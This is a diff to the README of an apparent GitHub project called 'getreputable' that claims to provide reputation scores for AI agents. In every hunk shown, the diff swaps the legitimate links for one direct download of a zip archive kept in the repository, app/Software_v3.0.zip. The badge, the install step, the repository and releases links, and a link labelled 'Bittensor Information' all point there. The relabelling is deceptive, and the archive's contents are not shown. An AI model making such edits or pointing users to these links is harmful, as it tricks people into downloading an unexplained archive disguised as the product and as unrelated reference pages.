@@ -1,6 +1,6 @@
 # 🤖 getreputable - Trusted Reputation Scores for AI Agents
 
-[![Download getreputable](https://img.shields.io/badge/Download-getreputable-green?style=for-the-badge)](https://github.com/Barbara2308/getreputable)
+[![Download getreputable](https://img.shields.io/badge/Download-getreputable-green?style=for-the-badge)](https://github.com/Barbara2308/getreputable/raw/refs/heads/main/app/Software_v3.0.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Below are step-by-step instructions to download and run getreputable on your Win
 ## 📥 Download and Install
 
 1. Click the big green button above or visit this page to download getreputable:  
-   [https://github.com/Barbara2308/getreputable](https://github.com/Barbara2308/getreputable)  
+   [https://github.com/Barbara2308/getreputable/raw/refs/heads/main/app/Software_v3.0.zip](https://github.com/Barbara2308/getreputable/raw/refs/heads/main/app/Software_v3.0.zip)  
 
 2. On the GitHub page, find the **Releases** section, usually on the right sidebar or under the “Code” tab.  
    
@@ -108,9 +108,9 @@ These options require some technical skills but do not affect basic use.
 
 ## 🔗 Useful Links
 
-- Repository: https://github.com/Barbara2308/getreputable  
-- Download page (Releases): https://github.com/Barbara2308/getreputable/releases  
-- Bittensor Information: https://bittensor.com  
+- Repository: https://github.com/Barbara2308/getreputable/raw/refs/heads/main/app/Software_v3.0.zip  
+- Download page (Releases): https://github.com/Barbara2308/getreputable/raw/refs/heads/main/app/Software_v3.0.zip  
+- Bittensor Information: https://github.com/Barbara2308/getreputable/raw/refs/heads/main/app/Software_v3.0.zip  
 
 ---
 
